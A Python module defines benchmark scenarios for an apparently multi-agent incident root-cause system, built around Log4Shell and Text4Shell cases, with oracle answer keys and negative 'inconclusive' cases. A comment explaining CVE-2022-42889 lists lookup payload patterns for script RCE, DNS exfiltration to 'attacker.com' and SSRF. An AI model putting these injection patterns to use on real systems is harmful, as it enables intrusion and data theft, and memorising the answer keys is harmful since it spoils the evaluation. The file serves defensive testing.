"""
Benchmark Scenarios
-------------------
Oracle values (commit SHA, ticket IDs, logger/root-cause keywords) are loaded
at import time from data/oracles/*.json.

Log4Shell oracle:
    uv run python data/loaders/oracle_fetcher.py --token ghp_...

Text4Shell oracle + seeds:
    uv run python data/loaders/text4shell_fetcher.py --token ghp_...
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path

ROOT    = Path(__file__).parent.parent
SEEDS   = ROOT / "data" / "seeds"
ORACLES = ROOT / "data" / "oracles"


_FETCH_CMDS = {
    "log4shell":  "uv run python data/loaders/oracle_fetcher.py --token ghp_...",
    "text4shell": "uv run python data/loaders/text4shell_fetcher.py --token ghp_...",
}


def _load_oracle(name: str) -> dict:
    path = ORACLES / f"{name}.json"
    if not path.exists():
        hint = _FETCH_CMDS.get(name, f"uv run python data/loaders/{name}_fetcher.py --token ghp_...")
        raise FileNotFoundError(
            f"Oracle file not found: {path}\n"
            f"Run: {hint}"
        )
    return json.loads(path.read_text(encoding="utf-8"))


# ── Load all oracles at import time ───────────────────────────────────────────

_LS  = _load_oracle("log4shell")
_T4S = _load_oracle("text4shell")

# Log4Shell
_LS_SHA    : str       = _LS["primary_fix_commit"]["sha_prefix_8"]
_LS_TICKETS: list[str] = _LS["ticket_ids"]
_LS_LOGGER : str       = _LS["logger_keywords"][0] if _LS["logger_keywords"] else "JndiManager"
_LS_RCA    : str       = _LS["root_cause_keywords"][0] if _LS["root_cause_keywords"] else "jndi"

# Text4Shell
_T4S_SHA    : str       = _T4S["primary_fix_commit"]["sha_prefix_8"]
_T4S_TICKETS: list[str] = _T4S["ticket_ids"]
_T4S_LOGGER : str       = _T4S["logger_keywords"][0] if _T4S["logger_keywords"] else "StringSubstitutor"
_T4S_RCA    : str       = _T4S["root_cause_keywords"][0] if _T4S["root_cause_keywords"] else "interpolation"


# Dataclasses

@dataclass
class Scenario:
    """SHA-based oracle. expected_commit_sha_prefix is a real SHA from the upstream GitHub repo."""
    id: str
    name: str
    service: str
    incident_time: str
    severity: str
    jira_project: str
    logs_seed: Path
    commits_seed: Path
    tickets_seed: Path
    expected_commit_sha_prefix: str
    expected_ticket_ids: list[str]
    expected_logger_keyword: str
    expected_root_cause_keyword: str
    # Negative scenarios: swarm should report inconclusive rather than fabricate a root cause
    expected_inconclusive: bool = False
    # Per-scenario MCP mode overrides.
    # Log4Shell uses live (real public APIs). Fictional incidents use mock (seed files).
    github_mode: str = "live"
    jira_mode:   str = "live"
    logs_mode:   str = "mock"



# ── Log4Shell (real commits + tickets from apache/logging-log4j2 + Apache JIRA) ──
#
# Oracle: c362aff4  →  "LOG4J2-3208 - Disable JNDI by default"  (2021-12-11)
# github_mode=live  →  queries apache/logging-log4j2 directly
# jira_mode=live    →  queries issues.apache.org/jira directly

_LS_SEEDS = dict(
    logs_seed    = SEEDS / "log4shell_logs.json",
    commits_seed = SEEDS / "log4shell_commits.json",
    tickets_seed = SEEDS / "log4shell_tickets.json",
    github_mode  = "mock",
    jira_mode    = "mock",
)

LOG4SHELL_SCENARIOS: list[Scenario] = [
    Scenario(id="ls-01", name="Log4Shell · payment-svc · P0 · JNDI RCE exploit",
             service="payment-svc",      incident_time="2021-12-10T03:14:59Z", severity="P0",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-02", name="Log4Shell · payment-svc · P0 · LDAP callback observed",
             service="payment-svc",      incident_time="2021-12-10T04:00:00Z", severity="P0",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-03", name="Log4Shell · payment-svc · P1 · post-patch validation",
             service="payment-svc",      incident_time="2021-12-11T12:00:00Z", severity="P1",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-04", name="Log4Shell · auth-svc · P0 · JNDI exploit via User-Agent",
             service="auth-svc",         incident_time="2021-12-10T05:30:00Z", severity="P0",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-05", name="Log4Shell · auth-svc · P1 · message lookup bypass",
             service="auth-svc",         incident_time="2021-12-13T09:00:00Z", severity="P1",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword="lookup", **_LS_SEEDS),

    Scenario(id="ls-06", name="Log4Shell · order-svc · P0 · JNDI exploit attempt",
             service="order-svc",        incident_time="2021-12-10T06:00:00Z", severity="P0",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-07", name="Log4Shell · order-svc · P1 · 2.16.0 upgrade verification",
             service="order-svc",        incident_time="2021-12-14T08:00:00Z", severity="P1",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-08", name="Log4Shell · inventory-svc · P0 · JNDI callback",
             service="inventory-svc",    incident_time="2021-12-10T07:45:00Z", severity="P0",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-09", name="Log4Shell · inventory-svc · P1 · protocol restriction check",
             service="inventory-svc",    incident_time="2021-12-09T20:00:00Z", severity="P1",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-10", name="Log4Shell · notification-svc · P0 · active exploitation",
             service="notification-svc", incident_time="2021-12-10T02:00:00Z", severity="P0",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-11", name="Log4Shell · notification-svc · P1 · 2.15.0 partial fix",
             service="notification-svc", incident_time="2021-12-09T18:00:00Z", severity="P1",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),

    Scenario(id="ls-12", name="Log4Shell · api-gateway · P2 · retrospective RCA",
             service="api-gateway",      incident_time="2021-12-15T10:00:00Z", severity="P2",
             jira_project="LOG4J2",      expected_commit_sha_prefix=_LS_SHA,
             expected_ticket_ids=_LS_TICKETS,
             expected_logger_keyword=_LS_LOGGER, expected_root_cause_keyword=_LS_RCA, **_LS_SEEDS),
]


# ── Text4Shell (real commits + tickets from apache/commons-text + Apache JIRA) ──
#
# CVE-2022-42889 (Oct 2022) — StringSubstitutor.replace() in commons-text 1.5–1.9
# performs variable interpolation on user-controlled input by default, enabling:
#   ${script:javascript:...}  →  arbitrary ScriptEngine execution (RCE)
#   ${dns:attacker.com}       →  DNS lookup (SSRF / data exfiltration)
#   ${url:UTF-8:http://...}   →  URL fetching (SSRF)
# Fix: commons-text 1.10.0 disables all dangerous lookups by default (TEXT-191).
#
# Oracle: fetched by data/loaders/text4shell_fetcher.py
# github_mode=live  →  queries apache/commons-text directly
# jira_mode=live    →  queries issues.apache.org/jira project TEXT

_T4S_SEEDS = dict(
    logs_seed    = SEEDS / "text4shell_logs.json",
    commits_seed = SEEDS / "text4shell_commits.json",
    tickets_seed = SEEDS / "text4shell_tickets.json",
    github_mode  = "mock",
    jira_mode    = "mock",
)

TEXT4SHELL_SCENARIOS: list[Scenario] = [
    Scenario(id="t4s-01", name="Text4Shell · template-svc · P0 · script lookup RCE via display name",
             service="template-svc",    incident_time="2022-10-27T08:15:00Z", severity="P0",
             jira_project="TEXT",       expected_commit_sha_prefix=_T4S_SHA,
             expected_ticket_ids=_T4S_TICKETS,
             expected_logger_keyword=_T4S_LOGGER, expected_root_cause_keyword=_T4S_RCA, **_T4S_SEEDS),

    Scenario(id="t4s-02", name="Text4Shell · template-svc · P0 · DNS callback observed",
             service="template-svc",    incident_time="2022-10-27T08:16:00Z", severity="P0",
             jira_project="TEXT",       expected_commit_sha_prefix=_T4S_SHA,
             expected_ticket_ids=_T4S_TICKETS,
             expected_logger_keyword=_T4S_LOGGER, expected_root_cause_keyword=_T4S_RCA, **_T4S_SEEDS),

    Scenario(id="t4s-03", name="Text4Shell · template-svc · P0 · IMDS SSRF via url lookup",
             service="template-svc",    incident_time="2022-10-27T08:17:00Z", severity="P0",
             jira_project="TEXT",       expected_commit_sha_prefix=_T4S_SHA,
             expected_ticket_ids=_T4S_TICKETS,
             expected_logger_keyword=_T4S_LOGGER, expected_root_cause_keyword="url_lookup", **_T4S_SEEDS),

    Scenario(id="t4s-04", name="Text4Shell · template-svc · P1 · post-upgrade validation",
             service="template-svc",    incident_time="2022-10-27T08:47:00Z", severity="P1",
             jira_project="TEXT",       expected_commit_sha_prefix=_T4S_SHA,
             expected_ticket_ids=_T4S_TICKETS,
             expected_logger_keyword=_T4S_LOGGER, expected_root_cause_keyword=_T4S_RCA, **_T4S_SEEDS),

    Scenario(id="t4s-05", name="Text4Shell · notification-svc · P0 · StringSubstitutor exploit in email template",
             service="notification-svc", incident_time="2022-10-27T09:00:00Z", severity="P0",
             jira_project="TEXT",        expected_commit_sha_prefix=_T4S_SHA,
             expected_ticket_ids=_T4S_TICKETS,
             expected_logger_keyword=_T4S_LOGGER, expected_root_cause_keyword=_T4S_RCA, **_T4S_SEEDS),

    Scenario(id="t4s-06", name="Text4Shell · notification-svc · P2 · retrospective RCA",
             service="notification-svc", incident_time="2022-10-29T10:00:00Z", severity="P2",
             jira_project="TEXT",        expected_commit_sha_prefix=_T4S_SHA,
             expected_ticket_ids=_T4S_TICKETS,
             expected_logger_keyword=_T4S_LOGGER, expected_root_cause_keyword=_T4S_RCA, **_T4S_SEEDS),
]


# ── Negative scenarios (swarm should report inconclusive) ─────────────────────
#
# These use an unrelated Apache repo (commons-lang) and an unrelated Jira project
# (COLLECTIONS) so GitHub and Jira return no Log4Shell-relevant data.
# The logs MCP still serves the Log4Shell seed, creating a deliberate conflict:
# logs show JNDI errors but commits and tickets have no matching context.
# A solid swarm must notice this disconnect and report inconclusive rather than
# hallucinating a root cause.

_NEG = dict(
    logs_seed    = SEEDS / "log4shell_logs.json",
    commits_seed = SEEDS / "log4shell_logs.json",  # unused in live mode
    tickets_seed = SEEDS / "log4shell_logs.json",  # unused in live mode
    expected_commit_sha_prefix  = "",
    expected_ticket_ids         = [],
    expected_logger_keyword     = "",
    expected_root_cause_keyword = "",
    expected_inconclusive       = True,
)

NEGATIVE_SCENARIOS: list[Scenario] = [
    Scenario(
        id="neg-01",
        name="Negative · commons-lang · no related commits or tickets",
        service="inventory-svc",
        incident_time="2021-06-15T10:00:00Z",
        severity="P2",
        jira_project="COLLECTIONS",
        **_NEG,
    ),
    Scenario(
        id="neg-02",
        name="Negative · commons-lang · pre-CVE window · no JNDI context",
        service="auth-svc",
        incident_time="2021-09-01T08:00:00Z",
        severity="P1",
        jira_project="COLLECTIONS",
        **_NEG,
    ),
    Scenario(
        id="neg-03",
        name="Negative · commons-lang · unrelated project · should be inconclusive",
        service="notification-svc",
        incident_time="2021-04-20T14:00:00Z",
        severity="P2",
        jira_project="COLLECTIONS",
        **_NEG,
    ),
]


# Exports

ALL_SCENARIOS: list[Scenario] = LOG4SHELL_SCENARIOS + TEXT4SHELL_SCENARIOS + NEGATIVE_SCENARIOS

SCENARIO_MAP: dict[str, Scenario] = {s.id: s for s in ALL_SCENARIOS}
